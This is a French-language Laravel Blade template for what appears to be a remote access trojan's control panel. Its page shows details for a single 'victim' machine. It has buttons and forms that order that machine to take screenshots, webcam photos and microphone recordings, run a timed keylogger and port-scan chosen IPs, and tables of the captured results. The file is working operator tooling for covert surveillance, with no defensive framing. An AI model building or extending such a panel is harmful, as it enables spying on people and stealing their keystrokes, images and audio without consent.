@extends("layouts.layout")

@section("title", "Détails de la victime")

@section("content")
<section class="section">
    <div class="card mb-3">
        <div class="row g-0">
            <div class="col-md-4">
                @if ($victim->os == 'windows')
                    <img src="{{ asset('images/windows.png') }}" class="img-fluid rounded-start" alt="Windows">
                @elseif ($victim->os == 'linux')
                    <img src="{{ asset('images/linux.png') }}" class="img-fluid rounded-start" alt="Linux">
                @endif
            </div>
            <div class="col-md-8">
                <div class="card-body">
                    <h1 class="card-title">{{ strtoupper($victim->uid) }}</h1>
                    <!-- Bordered Tabs Justified -->
                    <ul class="nav nav-tabs nav-tabs-bordered d-flex" id="borderedTabJustified" role="tablist">
                        <li class="nav-item flex-fill" role="presentation">
                            <button class="nav-link w-100 active" id="info-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-info" type="button" role="tab" aria-controls="info" aria-selected="true">Informations</button>
                        </li>
                        <li class="nav-item flex-fill" role="presentation">
                            <button class="nav-link w-100" id="record-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-record" type="button" role="tab" aria-controls="record" aria-selected="false">Enregistrements</button>
                        </li>
                        <li class="nav-item flex-fill" role="presentation">
                            <button class="nav-link w-100" id="picture-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-picture" type="button" role="tab" aria-controls="picture" aria-selected="false">Photos</button>
                        </li>
                        <li class="nav-item flex-fill" role="presentation">
                            <button class="nav-link w-100" id="screen-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-screen" type="button" role="tab" aria-controls="screen" aria-selected="false">Captures</button>
                        </li>
                        <li class="nav-item flex-fill" role="presentation">
                            <button class="nav-link w-100" id="scan-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-scan" type="button" role="tab" aria-controls="scan" aria-selected="false">Scan</button>
                        </li>
                        <li class="nav-item flex-fill" role="presentation">
                            <button class="nav-link w-100" id="keylogger-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-keylogger" type="button" role="tab" aria-controls="keylogger" aria-selected="false">Keylogger</button>
                        </li>
                    </ul>
                    @if(session('output'))
                        <div class="alert alert-info">{{ session('output') }}</div>
                    @endif
                    <div class="tab-content pt-2" id="borderedTabJustifiedContent">
                        <div class="tab-pane fade show active" id="bordered-justified-info" role="tabpanel" aria-labelledby="info-tab">
                            <div class="card">
                                <div class="card-body">
                                    <h5 class="card-title">Informations de la Victime</h5>
                                    <ul class="list-group">
                                        <li class="list-group-item"><strong>UID:</strong> {{ $victim->uid }}</li>
                                        <li class="list-group-item"><strong>Adresse IP:</strong> {{ $victim->ip }}</li>
                                        <li class="list-group-item"><strong>Système d'exploitation:</strong> {{ $victim->os }}</li>
                                        <li class="list-group-item"><strong>Statut:</strong> {{ $victim->status == 1 ? 'Actif' : 'Inactif' }}</li>
                                        @if ($group)
                                            <li class="list-group-item"><strong>Groupe:</strong> <a href="{{ route('network.show', ['id' => $group->id]) }}" class="card-link">{{ $group->name }}</a></li>
                                        @else
                                            <li class="list-group-item"><strong>Groupe:</strong> Non attribué</li>
                                        @endif
                                        <li class="list-group-item"><strong>Date de création:</strong> {{ $victim->created_at->format('d/m/Y') }}</li>
                                        <li class="list-group-item"><strong>Dernière mise à jour:</strong> {{ $victim->updated_at->format('d/m/Y') }}</li>
                                    </ul>

                                    <h5 class="card-title">Actions rapides</h5>

                                    <div class="d-flex flex-wrap">
                                        <form method="POST" action="{{ route('victims.scan') }}" class="me-2">
                                            @csrf
                                            <input type="hidden" name="victim_id" value="{{ $victim->id }}">
                                            <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
                                            <button type="submit" class="btn btn-warning">
                                                <i class="bi bi-broadcast"></i> Scan
                                            </button>
                                        </form>
                                        <form method="POST" action="{{ route('victims.screenshot') }}" class="me-2">
                                            @csrf
                                            <input type="hidden" name="victim_id" value="{{ $victim->id }}">
                                            <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
                                            <button type="submit" class="btn btn-warning">
                                                <i class="bi bi-fullscreen"></i> Screenshot
                                            </button>
                                        </form>
                                        <form method="POST" action="{{ route('victims.picture') }}" class="me-2">
                                            @csrf
                                            <input type="hidden" name="victim_id" value="{{ $victim->id }}">
                                            <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
                                            <button type="submit" class="btn btn-warning">
                                                <i class="bi bi-camera-fill"></i> Photo
                                            </button>
                                        </form>
                                        <form method="POST" action="{{ route('victims.record') }}">
                                            @csrf
                                            <input type="hidden" name="victim_id" value="{{ $victim->id }}">
                                            <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
                                            <button type="submit" class="btn btn-warning">
                                                <i class="bi bi-mic-fill"></i> Enregistrement
                                            </button>
                                        </form>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="tab-pane fade" id="bordered-justified-record" role="tabpanel" aria-labelledby="record-tab">
                            <div class="card">
                                <div class="card-body">
                                    <h5 class="card-title">Enregistrements</h5>
                                    <form method="POST" action="{{ route('victims.record') }}" class="row g-3">
                                        @csrf
                                            <input type="hidden" name="victim_id" value="{{ $victim->id }}">
                                            <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
                                            <div class="col-md-2">
                                                <input type="number" class="form-control" placeholder="time" name="time" min="10" required>
                                            </div>
                                            <div class="col-md-1">
                                                <button type="submit" class="btn btn-warning"><i class="bi bi-mic-fill"></i></button>
                                            </div>
                                    </form>
                                    <br>
                                    @if ($records->isEmpty())
                                        <div class="alert alert-warning" role="alert">
                                            Aucun enregistrement disponible.
                                        </div>
                                    @else
                                        <table class="table">
                                            <thead>
                                                <tr>
                                                    <th scope="col">Id</th>
                                                    <th scope="col">Nom</th>
                                                    <th scope="col">Heure</th>
                                                    <th scope="col">Date</th>
                                                    <th scope="col">Actions</th>
                                                </tr>
                                            </thead>
                                            <tbody>
                                                @foreach ($records as $record)
                                                    <tr>
                                                        <th scope="row">{{ $record->id }}</th>
                                                        <td>{{ $record->result }}</td>
                                                        <td>{{ $record->created_at->format('H:i') }}</td>
                                                        <td>{{ $record->created_at->format('d/m/Y') }}</td>
                                                        <td>
                                                            <button type="button" class="btn btn-success">Télécharger</button>
                                                            <button type="button" class="btn btn-danger">Supprimer</button>
                                                        </td>
                                                    </tr>
                                                @endforeach
                                            </tbody>
                                        </table>
                                    @endif
                                </div>
                            </div>
                        </div>

                        <div class="tab-pane fade" id="bordered-justified-picture" role="tabpanel" aria-labelledby="picture-tab">
                            <div class="card">
                                <div class="card-body">
                                    <h5 class="card-title">Photos</h5>
                                    <form method="POST" action="{{ route('victims.picture') }}" class="me-2">
                                        @csrf
                                        <input type="hidden" name="victim_id" value="{{ $victim->id }}">
                                        <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
                                        <button type="submit" class="btn btn-warning">
                                            <i class="bi bi-camera-fill"></i>
                                        </button>
                                    </form>
                                    <br>
                                    @if ($pictures->isEmpty())
                                        <div class="alert alert-warning" role="alert">
                                            Aucune photo enregistrée.
                                        </div>
                                    @else
                                        <table class="table">
                                            <thead>
                                                <tr>
                                                    <th scope="col">Id</th>
                                                    <th scope="col">Nom</th>
                                                    <th scope="col">Heure</th>
                                                    <th scope="col">Date</th>
                                                    <th scope="col">Actions</th>
                                                </tr>
                                            </thead>
                                            <tbody>
                                                @foreach ($pictures as $picture)
                                                    <tr>
                                                        <th scope="row">{{ $picture->id }}</th>
                                                        <td>{{ $picture->result }}</td>
                                                        <td>{{ $picture->created_at->format('H:i') }}</td>
                                                        <td>{{ $picture->created_at->format('d/m/Y') }}</td>
                                                        <td>
                                                            <button type="button" class="btn btn-success">Télécharger</button>
                                                            <button type="button" class="btn btn-danger">Supprimer</button>
                                                        </td>
                                                    </tr>
                                                @endforeach
                                            </tbody>
                                        </table>
                                    @endif
                                </div>
                            </div>
                        </div>

                        <div class="tab-pane fade" id="bordered-justified-screen" role="tabpanel" aria-labelledby="screen-tab">
                            <div class="card">
                                <div class="card-body">
                                    <h5 class="card-title">Captures</h5>
                                    <form method="POST" action="{{ route('victims.screenshot') }}" class="row g-3">
                                        @csrf
                                            <input type="hidden" name="victim_id" value="{{ $victim->id }}">
                                            <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
                                            <div class="col-md-2">
                                                <input type="number" class="form-control" placeholder="number" name="number" required>
                                            </div>
                                            <div class="col-md-1">
                                                <button type="submit" class="btn btn-warning"><i class="bi bi-fullscreen"></i></button>
                                            </div>
                                    </form>
                                    <br>
                                    @if ($screenshots->isEmpty())
                                        <div class="alert alert-warning" role="alert">
                                            Aucune capture d'écran enregistrée.
                                        </div>
                                    @else
                                        <table class="table">
                                            <thead>
                                                <tr>
                                                    <th scope="col">Id</th>
                                                    <th scope="col">Nom</th>
                                                    <th scope="col">Heure</th>
                                                    <th scope="col">Date</th>
                                                    <th scope="col">Actions</th>
                                                </tr>
                                            </thead>
                                            <tbody>
                                                @foreach ($screenshots as $screenshot)
                                                    <tr>
                                                        <th scope="row">{{ $screenshot->id }}</th>
                                                        <td>{{ $screenshot->result }}</td>
                                                        <td>{{ $screenshot->created_at->format('H:i') }}</td>
                                                        <td>{{ $screenshot->created_at->format('d/m/Y') }}</td>
                                                        <td>
                                                            <button type="button" class="btn btn-success">Télécharger</button>
                                                            <button type="button" class="btn btn-danger">Supprimer</button>
                                                        </td>
                                                    </tr>
                                                @endforeach
                                            </tbody>
                                        </table>
                                    @endif
                                </div>
                            </div>
                        </div>

                        <div class="tab-pane fade" id="bordered-justified-scan" role="tabpanel" aria-labelledby="scan-tab">
                            <div class="card">
                                <div class="card-body">
                                    <h5 class="card-title">Scan</h5>
                                    <form method="POST" action="{{ route('victims.scanport') }}" class="row g-3">
                                        @csrf
                                        <input type="hidden" name="victim_id" value="{{ $victim->id }}">
                                        <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
                                        <div class="col-md-2">
                                            <input type="text" class="form-control" placeholder="ip" name="ip">
                                        </div>
                                        <div class="col-md-2">
                                            <input type="number" class="form-control" name="port1" required min="1" max="65535" placeholder="port 1">
                                        </div>
                                        <div class="col-md-2">
                                            <input type="number" class="form-control" name="port2" min="1" max="65535" placeholder="port 2">
                                        </div>
                                        <div class="col-md-1">
                                            <button type="submit" class="btn btn-warning"><i class="bi bi-broadcast"></i></button>
                                        </div>
                                    </form>
                                    <br>
                                    @if ($scans->isEmpty())
                                        <div class="alert alert-warning" role="alert">
                                            Aucun scan enregistré.
                                        </div>
                                    @else
                                        <table class="table">
                                            <thead>
                                                <tr>
                                                    <th scope="col">Id</th>
                                                    <th scope="col">Nom</th>
                                                    <th scope="col">Heure</th>
                                                    <th scope="col">Date</th>
                                                    <th scope="col">Actions</th>
                                                </tr>
                                            </thead>
                                            <tbody>
                                                @foreach ($scans as $scan)
                                                    <tr>
                                                        <th scope="row">{{ $scan->id }}</th>
                                                        <td>{{ $scan->result }}</td>
                                                        <td>{{ $scan->created_at->format('H:i') }}</td>
                                                        <td>{{ $scan->created_at->format('d/m/Y') }}</td>
                                                        <td>
                                                            <button type="button" class="btn btn-success">Télécharger</button>
                                                            <button type="button" class="btn btn-danger">Supprimer</button>
                                                        </td>
                                                    </tr>
                                                @endforeach
                                            </tbody>
                                        </table>
                                    @endif
                                </div>
                            </div>
                        </div>

                        <div class="tab-pane fade" id="bordered-justified-keylogger" role="tabpanel" aria-labelledby="keylogger-tab">
                            <div class="card">
                                <div class="card-body">
                                    <h5 class="card-title">Keylogger</h5>
                                    <form method="POST" action="{{ route('victims.keylogger') }}" class="row g-3">
                                        @csrf
                                            <input type="hidden" name="victim_id" value="{{ $victim->id }}">
                                            <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
                                            <div class="col-md-2">
                                                <input type="number" class="form-control" placeholder="time" name="time" min="10" required>
                                            </div>
                                            <div class="col-md-1">
                                                <button type="submit" class="btn btn-warning"><i class="bi bi-keyboard"></i></button>
                                            </div>
                                    </form>
                                    <br>
                                    @if ($keyloggers->isEmpty())
                                        <div class="alert alert-warning" role="alert">
                                            Aucun keylogger enregistré.
                                        </div>
                                    @else
                                        <table class="table">
                                            <thead>
                                                <tr>
                                                    <th scope="col">Id</th>
                                                    <th scope="col">Nom</th>
                                                    <th scope="col">Heure</th>
                                                    <th scope="col">Date</th>
                                                    <th scope="col">Actions</th>
                                                </tr>
                                            </thead>
                                            <tbody>
                                                @foreach ($keyloggers as $keylogger)
                                                    <tr>
                                                        <th scope="row">{{ $keylogger->id }}</th>
                                                        <td>{{ $keylogger->result }}</td>
                                                        <td>{{ $keylogger->created_at->format('H:i') }}</td>
                                                        <td>{{ $keylogger->created_at->format('d/m/Y') }}</td>
                                                        <td>
                                                            <button type="button" class="btn btn-success">Télécharger</button>
                                                            <button type="button" class="btn btn-danger">Supprimer</button>
                                                        </td>
                                                    </tr>
                                                @endforeach
                                            </tbody>
                                        </table>
                                    @endif
                                </div>
                            </div>
                        </div>
                    </div><!-- End Bordered Tabs Justified -->
                </div>
            </div>
        </div>
    </div>
</section>
@endsection
